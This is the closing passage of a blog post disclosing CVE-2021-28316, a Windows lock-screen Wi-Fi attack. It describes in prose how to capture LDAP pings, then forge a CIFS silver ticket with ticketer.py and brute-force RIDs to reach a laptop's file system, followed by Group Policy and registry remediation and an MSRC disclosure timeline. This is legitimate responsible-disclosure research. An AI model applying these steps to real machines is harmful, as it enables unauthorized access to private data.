</code></pre><p>We can now disconnect and reconnect the laptop from our access point and examine the contents of our new pcap file. If we filter our packets for the <code>CLDAP</code> protocol we can see the laptop attempting an <code>LDAP ping</code> against our attacker IP. The contents of the LDAP ping messages contain the Active Directory domain name, host name of the laptop and domain SID.</p><p>We can once again use the tool <code>ticketer.py</code> to create a silver ticket for the CIFS service and authenticate using <code>smbclient</code> to gain unrestricted access to the device&rsquo;s file system.</p><blockquote><p><strong>Note:</strong> There may be instances in which the default RID 500 account does not have local administrator rights on the domain joined host. In this case, a brute force approach can be taken by incrementing the RID contained in the silver ticket until a valid account is found.</p></blockquote><h3 id=remediation>Remediation<a hidden class=anchor aria-hidden=true href=#remediation>#</a></h3><p>This issue was disclosed to the Microsoft Security Response Center and has been addressed in the latest <a href=https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-28316>April 2021 security update</a>.</p><p>As a further hardening measure, the ability to access the network selection UI from the lock screen can be disabled via the below Group Policy setting.</p><pre><code>Computer Configuration | Administrative Templates | System | Logon --&gt; Do not display network selection UI
</code></pre><p>This setting can also be configured via the registry by enabling the <code>DontDisplayNetworkSelectionUI</code> flag.</p><pre><code>[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System]
&quot;DontDisplayNetworkSelectionUI&quot;=dword:00000001
</code></pre><h3 id=acknowledgements>Acknowledgements<a hidden class=anchor aria-hidden=true href=#acknowledgements>#</a></h3><p>Thanks to Elad Shamir <a href=https://twitter.com/elad_shamir>@elad_shamir</a> for his guidance and encouragement to continue research into the issue.</p><p>Also thanks to Danyal Drew <a href=https://twitter.com/danyaldrew>@DanyalDrew</a> for helping to solve the domain SID problem allowing for FDE bypass.</p><p>Further thanks to Moxie Marlinspike and David Hulton for the inspiring talk and the <a href=https://crack.sh/wpa-enterprise/>crack.sh</a> service which makes this exploit possible.</p><h3 id=disclosure-timeline>Disclosure Timeline<a hidden class=anchor aria-hidden=true href=#disclosure-timeline>#</a></h3><ul><li>11/12/2020 - Issue reported to MSRC with 90 day disclosure deadline</li><li>9/01/2021 - Update from MSRC that they are investigating the issue</li><li>29/01/2021 - MSRC ask for more time to explore potential fixes</li><li>11/03/2021 - MSRC confirm the behavior reported</li><li>12/04/2021 - MSRC confirm a patch will be released as part of the April security update</li><li>14/04/2021 - Microsoft release patch in April security update (CVE 2021-28316 assigned)</li></ul><p><strong>This article was also posted on <a href=https://shenaniganslabs.io/2021/04/13/Airstrike.html>shenaniganslabs.io</a></strong></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://breakfix.co/posts/leveraging-vscode-extensions-for-initial-access/><span class=title>« Prev</span><br><span>Leveraging VSCode Extensions for Initial Access</span>
</a><a class=next href=https://breakfix.co/posts/apache-struts2-ognl-console-and-devmode-exploitation/><span class=title>Next »</span><br><span>Apache Struts2 OGNL Console and devMode exploitation</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://breakfix.co/></a></span>·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script></body></html>